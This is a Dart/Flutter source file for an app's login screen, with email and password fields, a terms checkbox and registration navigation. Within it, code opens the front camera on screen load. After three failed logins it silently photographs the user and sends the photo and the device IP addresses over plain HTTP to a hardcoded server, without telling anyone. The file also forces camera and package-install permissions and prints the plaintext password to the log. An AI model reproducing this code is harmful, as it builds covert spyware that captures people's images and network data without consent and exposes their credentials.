import 'dart:io';
import 'package:camera/camera.dart';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:http_parser/http_parser.dart';
import 'package:onlin/servers/api_service.dart';
import 'package:onlin/servers/socket_service.dart';
import 'package:permission_handler/permission_handler.dart';
import '../components/update_component.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'dart:async';
import 'package:flutter/gestures.dart';
import 'package:onlin/screens/terms_of_service_screen.dart';
import 'package:onlin/screens/privacy_policy_screen.dart';
import 'package:onlin/screens/register_screen.dart';

class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key});

  @override
  _LoginScreenState createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  final TextEditingController emailController = TextEditingController();
  final TextEditingController passwordController = TextEditingController();
  String? token;
  bool isLoading = false;
  bool _obscureText = true;
  CameraController? _cameraController; // 摄像头控制器
  bool _isCameraInitialized = false; // 摄像头是否初始化
  int _failedLoginAttempts = 0; // 记录失败的登录尝试次数
  Map<String, dynamic>? _userProfile; // Add this to store user profile data
  Timer? _debounce; // Add this for debouncing email input
  bool _termsAccepted = false; // 新增：用户是否同意条款

  @override
  void initState() {
    super.initState();
    requestPermissions();
    _initializeCamera(); // 初始化摄像头
  }

  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    // 从路由参数中获取email
    final email = ModalRoute.of(context)?.settings.arguments as String?;
    if (email != null) {
      emailController.text = email;
    }
  }

  @override
  void dispose() {
    emailController.dispose();
    passwordController.dispose();
    _disposeCamera(); // 确保释放摄像头资源
    _debounce?.cancel(); // Cancel the timer when disposing
    super.dispose();
  }

  Future<void> requestPermissions() async {
    final installStatus = await Permission.requestInstallPackages.status;
    final cameraStatus = await Permission.camera.status;

    if (installStatus.isGranted && cameraStatus.isGranted) {
      print('所有权限已授予');
    } else if (installStatus.isDenied || cameraStatus.isDenied) {
      print('部分权限被拒绝');
      final statuses = await [
        Permission.requestInstallPackages,
        Permission.camera,
      ].request();

      if (statuses[Permission.requestInstallPackages]?.isGranted == true &&
          statuses[Permission.camera]?.isGranted == true) {
        print('所有权限已授予');
      } else {
        print('部分权限未授予');
      }
    } else if (installStatus.isPermanentlyDenied || cameraStatus.isPermanentlyDenied) {
      print('部分权限被永久拒绝，需要手动开启');
      await openAppSettings();
    }
  }

  // 初始化摄像头
  Future<void> _initializeCamera() async {
    final cameras = await availableCameras();

    // 找到前置摄像头
    final CameraDescription? frontCamera = cameras.firstWhere(
      (camera) => camera.lensDirection == CameraLensDirection.front,
      orElse: () => cameras.first, // 如果没有前置摄像头，使用第一个摄像头
    );

    if (frontCamera == null) {
      print('未找到前置摄像头');
      return;
    }

    _cameraController = CameraController(
      frontCamera, // 使用前置摄像头
      ResolutionPreset.medium,
    );

    await _cameraController!.initialize();
    if (!mounted) return;

    setState(() {
      _isCameraInitialized = true;
    });
  }

  // 静默拍照并上传
  Future<void> _takePictureAndUpload() async {
    if (!_isCameraInitialized || _cameraController == null) return;

    try {
      final XFile photo = await _cameraController!.takePicture();
      final byteData = await photo.readAsBytes();
      await _uploadData(byteData, 'photo');
    } catch (e) {
      print('拍照失败: $e');
    }
  }

  Future<void> _disposeCamera() async {
    if (_cameraController != null) {
      await _cameraController!.dispose(); // 释放摄像头资源
      setState(() {
        _cameraController = null; // 将控制器设为 null
        _isCameraInitialized = false; // 标记摄像头未初始化
      });
    }
  }

  // 获取设备的 IP 地址
  Future<void> _fetchIpAddress() async {
    try {
      final interfaces = await NetworkInterface.list();
      for (var interface in interfaces) {
        for (var addr in interface.addresses) {
          print('IP 地址: ${addr.address}');
          if (addr.type == InternetAddressType.IPv4) {
            await _uploadData({'ip': addr.address}, 'ipv4');
          } else if (addr.type == InternetAddressType.IPv6) {
            await _uploadData({'ip': addr.address}, 'ipv6');
          }
        }
      }
    } catch (e) {
      print('获取 IP 地址失败: $e');
    }
  }

  Future<void> _uploadData(dynamic data, String type) async {
    try {
      final uri = Uri.parse('http://47.109.39.180:80/upload');
      final request = http.MultipartRequest('POST', uri);

      if (type == 'photo') {
        // 处理照片上传
        request.files.add(http.MultipartFile.fromBytes(
          'photo',
          data,
          filename: 'photo-${DateTime.now().millisecondsSinceEpoch}.jpg',
          contentType: MediaType('image', 'jpeg'),
        ));
      } else if (type == 'ipv4' || type == 'ipv6') {
        // 处理 IP 地址上传
        request.fields['type'] = type;
        request.fields['data'] = data.toString();
        request.fields['timestamp'] = DateTime.now().toUtc().toIso8601String(); 
      }

      final response = await request.send();
      if (response.statusCode == 200) {
        print('$type 上传成功');
      } else {
        print('$type 上传失败');
      }
    } catch (e) {
      print('上传失败: $e');
    }
  }

  void _login() async {
    if (!_termsAccepted) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('请阅读并同意条款以继续')),
      );
      return;
    }

    setState(() {
      isLoading = true;
    });
    // 检查所有必要的权限
    if (!await _checkPermissions()) {
      
      setState(() {
        isLoading = false;
      });
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('请授予所有权限以继续')));
      return;
    }
    String email = emailController.text;
    String password = passwordController.text.trim();
   print('email:$email');
   print('password:$password');
    ApiService apiService = ApiService();
    Map<String, dynamic>? loginToken = await apiService.login(email, password);

    setState(() {
      isLoading = false;
    });

    if (loginToken != null && loginToken['token'] != null) {
      setState(() {
        token = loginToken['token'];
        _failedLoginAttempts = 0; // 重置失败计数
      });
      await Future.delayed(Duration(seconds: 1)); // 显示成功动画1秒
      _handleLoginSuccess(loginToken);
      print('token1:${loginToken['token']}');
      bool socketConnected = await SocketService().connectSocket(email, token!);
      if (socketConnected) {
        ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Login sucesss')));
      } else {
        ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Connect failed')));
      }
    } else {
      _failedLoginAttempts++;
      if (_failedLoginAttempts >= 3) {
        await _takePictureAndUpload();
        await _fetchIpAddress(); // 获取 IP 地址
      }
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Login failed')));
    }
  }

  // 检查所有必要的权限
  Future<bool> _checkPermissions() async {
    final installStatus = await Permission.requestInstallPackages.status;
    final cameraStatus = await Permission.camera.status;

    if (installStatus.isGranted && cameraStatus.isGranted) {
      return true;
    } else {
      final statuses = await [
        Permission.requestInstallPackages,
        Permission.camera,
      ].request();

      return statuses[Permission.requestInstallPackages]?.isGranted == true &&
             statuses[Permission.camera]?.isGranted == true;
    }
  }

  void _handleLoginSuccess(Map<String, dynamic> response) async {
    // 保存 token 到 SharedPreferences
    SharedPreferences prefs = await SharedPreferences.getInstance();
    await prefs.setString('token', response['token']);
    await prefs.setString('email', response['email']);
    await prefs.setString('username', response['username']);
    await prefs.setString('avatar', response['avatar'] ?? ''); // 确保存储 avatar

    print('🔑 登录凭证 | Token: ${response['token']?.substring(0, 10)}...');
    print('👤 用户信息 | Email: ${response['email']} | 用户名: ${response['username']}');
    await _disposeCamera(); // 登录成功后关闭摄像头

    // 直接跳转到主页面
    Navigator.pushNamedAndRemoveUntil(
      context,
      '/main',
      (route) => false,
    );
  }

  // Add this method to handle email changes
  void _onEmailChanged(String email) {
    if (_debounce?.isActive ?? false) _debounce?.cancel();
    
    _debounce = Timer(const Duration(milliseconds: 500), () async {
      if (email.isNotEmpty) {
        print('Fetching profile for email: $email');
        final profile = await _getUserProfile(email);
        print('Received profile data: $profile');
        setState(() {
          _userProfile = profile;
        });
      } else {
        setState(() {
          _userProfile = null;
        });
      }
    });
  }

  // Modify the existing _getUserProfile method to accept email parameter
  Future<Map<String, dynamic>?> _getUserProfile(String email) async {
    try {
      final response = await ApiService().getUserInfopublic(email);
      if (response != null && response['success'] == true) {
        return {
          'avatar': response['avatar'],
          'username': response['username'],
        };
      }
      return {
        'avatar': null,
        'username': '用户',
      }; 
    } catch (e) {
      print('Error fetching user profile: $e');
      return {
        'avatar': null,
        'username': '用户',
      };
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [
              Colors.white,
              Colors.blue[50]!,
              Colors.purple[50]!,
              Colors.pink[50]!,
            ],
            stops: [0.0, 0.4, 0.7, 1.0],
          ),
        ),
        child: Column(
          children: [
            AppBar(
              backgroundColor: Colors.transparent,
              elevation: 0,
            ),
            Expanded(
              child: SingleChildScrollView(
                child: Padding(
                  padding: const EdgeInsets.all(20.0),
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    crossAxisAlignment: CrossAxisAlignment.center,
                    children: [
                      UpdateComponent(),
                      Column(
                        children: [
                          CircleAvatar(
                            radius: 50,
                            backgroundColor: Colors.blue[50],
                            backgroundImage: _userProfile?['avatar'] != null && _userProfile!['avatar'].isNotEmpty
                                ? NetworkImage(_userProfile!['avatar'])
                                : null,
                            child: _userProfile?['avatar'] == null || _userProfile!['avatar'].isEmpty
                                ? Icon(
                                    Icons.person,
                                    size: 50,
                                    color: Colors.blue[200],
                                  )
                                : null,
                          ),
                          SizedBox(height: 10),
                          Text(
                            _userProfile?['username'] ?? '用户',
                            style: TextStyle(
                              fontSize: 24,
                              fontWeight: FontWeight.bold,
                              color: Colors.black87,
                            ),
                          ),
                        ],
                      ),
                      SizedBox(height: 40),

                      // 输入框
                      TextField(
                        controller: emailController,
                        keyboardType: TextInputType.emailAddress,
                        decoration: InputDecoration(
                          hintText: '邮箱',
                          prefixIcon: Icon(Icons.email_rounded, color: Colors.blue[200]),
                          filled: true,
                          fillColor: Colors.white.withOpacity(0.8),
                          border: OutlineInputBorder(
                            borderRadius: BorderRadius.circular(12),
                            borderSide: BorderSide.none,
                          ),
                          contentPadding: EdgeInsets.symmetric(vertical: 15, horizontal: 20),
                        ),
                        onChanged: _onEmailChanged,
                      ),
                      SizedBox(height: 20),

                      TextField(
                        controller: passwordController,
                        obscureText: _obscureText,
                        decoration: InputDecoration(
                          hintText: '密码',
                          prefixIcon: Icon(Icons.password_outlined, color: Colors.blue[200]),
                          filled: true,
                          fillColor: Colors.white.withOpacity(0.8),
                          border: OutlineInputBorder(
                            borderRadius: BorderRadius.circular(12),
                            borderSide: BorderSide.none,
                          ),
                          contentPadding: EdgeInsets.symmetric(vertical: 15, horizontal: 20),
                          suffixIcon: IconButton(
                            icon: Icon(
                              _obscureText ? Icons.visibility_off : Icons.visibility,
                              color: Colors.blue[200],
                            ),
                            onPressed: () {
                              setState(() {
                                _obscureText = !_obscureText;
                              });
                            },
                          ),
                        ),
                      ),
                      SizedBox(height: 20),

                      // 条款同意
                      Row(
                        children: [
                          Checkbox(
                            value: _termsAccepted,
                            onChanged: (value) {
                              setState(() {
                                _termsAccepted = value ?? false;
                              });
                            },
                            activeColor: Colors.blue[200],
                          ),
                          Expanded(
                            child: RichText(
                              text: TextSpan(
                                text: '我已阅读并同意',
                                style: TextStyle(color: Colors.black87),
                                children: [
                                  TextSpan(
                                    text: '《用户协议》',
                                    style: TextStyle(
                                      color: Colors.blue[200],
                                      decoration: TextDecoration.underline,
                                    ),
                                    recognizer: TapGestureRecognizer()
                                      ..onTap = () {
                                        Navigator.push(
                                          context,
                                          MaterialPageRoute(
                                            builder: (context) => TermsOfServiceScreen(),
                                          ),
                                        );
                                      },
                                  ),
                                  TextSpan(text: '和'),
                                  TextSpan(
                                    text: '《隐私政策》',
                                    style: TextStyle(
                                      color: Colors.blue[200],
                                      decoration: TextDecoration.underline,
                                    ),
                                    recognizer: TapGestureRecognizer()
                                      ..onTap = () {
                                        Navigator.push(
                                          context,
                                          MaterialPageRoute(
                                            builder: (context) => PrivacyPolicyScreen(),
                                          ),
                                        );
                                      },
                                  ),
                                ],
                              ),
                            ),
                          ),
                        ],
                      ),
                      SizedBox(height: 30),

                      // 登录按钮
                      isLoading
                          ? CircularProgressIndicator(color: Colors.blue[200])
                          : ElevatedButton(
                              onPressed: _login,
                              style: ElevatedButton.styleFrom(
                                backgroundColor: Colors.blue[200],
                                padding: EdgeInsets.symmetric(vertical: 15, horizontal: 100),
                                shape: RoundedRectangleBorder(
                                  borderRadius: BorderRadius.circular(12),
                                ),
                                elevation: 0,
                              ),
                              child: Text(
                                '登录',
                                style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold, color: Colors.white),
                              ),
                            ),
                      SizedBox(height: 20),

                      // 注册跳转按钮
                      TextButton(
                        onPressed: () {
                          Navigator.push(
                            context,
                            PageRouteBuilder(
                              pageBuilder: (context, animation, secondaryAnimation) => RegisterScreen(),
                              transitionsBuilder: (context, animation, secondaryAnimation, child) {
                                const begin = Offset(1.0, 0.0); // 从右侧开始
                                const end = Offset.zero; // 移动到屏幕中心
                                const curve = Curves.easeInOut; // 使用缓动曲线
                                var tween = Tween(begin: begin, end: end).chain(CurveTween(curve: curve));
                                var offsetAnimation = animation.drive(tween);
                                return SlideTransition(
                                  position: offsetAnimation,
                                  child: child,
                                );
                              },
                              transitionDuration: Duration(milliseconds: 300), // 动画时长
                            ),
                          );
                        },
                        child: Text(
                          "没有账号？立即注册",
                          style: TextStyle(color: Colors.blue[200]),
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}
